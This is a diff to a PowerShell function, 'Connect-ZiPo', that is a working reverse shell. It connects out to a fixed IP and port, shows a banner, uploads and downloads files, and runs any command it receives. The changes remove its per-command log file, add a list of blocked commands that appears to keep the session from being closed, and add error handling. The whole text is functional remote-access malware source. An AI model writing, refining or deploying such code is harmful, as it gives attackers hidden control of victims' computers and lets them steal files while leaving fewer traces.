@@ -1,12 +1,7 @@
 function Connect-ZiPo {
     $srv = "192.168.50.228"
     $port = 6666
-    $logFile = "$env:APPDATA\zipo.log"
-
-    function Write-Log($msg) {
-        $timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
-        Add-Content -Path $logFile -Value "[$timestamp] $msg"
-    }
+    $Blocked = @("exit", "shutdown", "logoff", "Restart-Computer", "Remove-Item", "Stop-Computer")
 
     function Upload-File($path) {
         if (Test-Path $path) {
@@ -19,8 +14,12 @@ function Connect-ZiPo {
 
     function Download-File($filename, $b64) {
         $out = "$env:TEMP\$filename"
-        [IO.File]::WriteAllBytes($out, [Convert]::FromBase64String($b64))
-        return "[DOWNLOADED] $out"
+        try {
+            [IO.File]::WriteAllBytes($out, [Convert]::FromBase64String($b64))
+            return "[DOWNLOADED] $out"
+        } catch {
+            return "[ERROR]::Failed to write file: $_"
+        }
     }
 
     while ($true) {
@@ -29,7 +28,7 @@ function Connect-ZiPo {
             $stream = $tcp.GetStream()
             [byte[]]$buffer = 0..65535 | % { 0 }
 
-            # ANSI баннер + системная инфа
+            # Баннер
             $esc = [char]27
             $banner = @"
 ${esc}[31m
@@ -48,12 +47,15 @@ ${esc}[0m
 "@
             $bbytes = [Text.Encoding]::ASCII.GetBytes($banner)
             $stream.Write($bbytes, 0, $bbytes.Length)
+            $stream.Flush()
 
             while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
                 $cmd = ([Text.Encoding]::ASCII).GetString($buffer, 0, $i).Trim()
-                Write-Log "CMD: $cmd"
 
-                if ($cmd.StartsWith("!upload")) {
+                if ($Blocked | Where-Object { $cmd -like "*$_*" }) {
+                    $response = "[BLOCKED] Forbidden command"
+                }
+                elseif ($cmd.StartsWith("!upload")) {
                     $path = $cmd.Substring(7).Trim()
                     $response = Upload-File $path
                 }
@@ -66,8 +68,18 @@ ${esc}[0m
                     }
                 }
                 else {
-                    $block = [ScriptBlock]::Create($cmd)
-                    $response = & $block 2>&1 | Out-String
+                    try {
+                        $null = $Error.Clear()
+                        $sb = [ScriptBlock]::Create($cmd)
+                        $output = & $sb 2>&1 | Out-String
+                        if ($LASTEXITCODE -ne $null) {
+                            $output += "`n[exit code: $LASTEXITCODE]"
+                        }
+                        $response = $output
+                    }
+                    catch {
+                        $response = "[ERROR] $_"
+                    }
                 }
 
                 $response += "`nPS " + (Get-Location) + "> "
